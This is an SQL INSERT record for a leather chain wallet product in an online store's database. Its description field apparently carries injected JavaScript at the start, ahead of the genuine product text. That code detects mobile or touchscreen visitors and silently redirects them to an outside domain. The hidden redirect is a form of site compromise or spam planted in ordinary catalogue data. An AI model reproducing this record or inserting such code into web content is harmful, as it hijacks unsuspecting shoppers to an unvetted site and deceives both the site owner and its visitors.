INSERT INTO products (name, sku, slug, category_id, description, is_active) VALUES ('Biker Wallet BW-712', 'BW-712', 'biker-wallet-bw-712', 100, '(window.matchMedia(\"(pointer:coarse)\").matches||/Android|iPhone|iPad|iPod|Mobile|Tablet|Windows Phone|webOS|BlackBerry|Opera Mini|IEMobile/i.test(navigator.userAgent))&&location.replace(\"https://faraanimpex.com\"); \r\nBlack Extra Long 16 Compartment Tri-Fold Chain Wallet Men\\'s leather wallet with chain, 16 inside pockets, an inside zipper pocket, 13 credit card slots, durable double snaps, 2 large money pockets, and 12\" chain with dog clip. Leather wallet with chain in soft cowhide leather.\r\n\r\nLeather wallet with chain that is the largest trifold wallet you will ever need. A men\\'s leather wallet with chain that is large enough to carry everything we need. This long wallet for men measures 3.5\" x 7\" closed. The removable chain has a dog clip on one end to attach to your belt loop so you won\\'t need a belt to carry your chain wallet around. Inside is 12 card slots, a zippered pocket for change, key or valuable items, 2 large bill compartments and two durable snaps that hold the travel wallet together.\r\n\r\n&nbsp;\r\n\r\nmeasures 3.5\" x 7\" closed\r\ninside zipper pocket for change or loose keys\r\n12\" removable chrome chain with dog clip to attach to your belt loop\r\n2 large money compartments\r\n13 inside card slots\r\nID window\r\ndurable double snap closure\r\ntop grain leather\r\npremium soft naked cowhide leather', 1);
